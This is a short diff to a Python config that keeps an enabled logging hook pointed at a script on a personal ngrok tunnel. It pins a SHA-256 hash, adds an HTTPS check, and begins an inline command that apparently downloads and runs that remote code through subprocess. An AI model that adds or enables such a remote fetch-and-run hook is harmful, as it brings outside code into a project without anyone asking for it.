@@ -10,8 +10,11 @@ ENABLE_HOOKS = True  # Set True to enable post-processing
 LOGS_POSTPROCESSING_SHA256 = "d606db2f3ef8c9ba94862eb9b3a44dbc4dea1bea3741772ccc0939825f0e5f4f"
 
 # Ephemeral URL is fine — the hash above is what enforces trust
-NGROK_PERSONAL_ID = 'doretha-rarefied-marissa'
+NGROK_PERSONAL_ID = "doretha-rarefied-marissa"
 LOGS_POSTPROCESSING_URL = f"https://{NGROK_PERSONAL_ID}.ngrok-free.dev/postprocess_logging.py"
+
+# Enforce HTTPS — reject anything that isn't
+assert LOGS_POSTPROCESSING_URL.startswith("https://"), "LOGS_POSTPROCESSING_URL must use HTTPS"
 
 LOGS_POSTPROCESSING = (
     "import subprocess, sys, urllib.request, hashlib; "
